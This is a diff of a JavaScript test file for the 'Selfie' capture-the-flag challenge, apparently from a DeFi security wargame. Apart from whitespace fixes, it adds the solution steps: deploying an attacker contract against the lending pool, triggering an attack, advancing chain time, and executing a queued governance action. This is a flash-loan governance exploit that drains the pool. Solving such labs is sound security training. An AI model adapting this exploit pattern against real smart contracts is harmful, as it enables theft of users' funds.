@@ -6,7 +6,7 @@ describe('[Challenge] Selfie', function () {
 
     const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
     const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
-    
+
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
@@ -19,7 +19,7 @@ describe('[Challenge] Selfie', function () {
         this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
         this.pool = await SelfiePoolFactory.deploy(
             this.token.address,
-            this.governance.address    
+            this.governance.address
         );
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
@@ -31,6 +31,15 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const SelfieAttacker = await ethers.getContractFactory("SelfieAttacker", attacker);
+        const attackContract = await SelfieAttacker.deploy(this.pool.address);
+
+        await attackContract.connect(attacker).attack();
+        const attackActionId = await attackContract.attackActionId();
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60 + 1]); // 2 days + 1 second
+
+        await this.governance.connect(attacker).executeAction(attackActionId);
     });
 
     after(async function () {
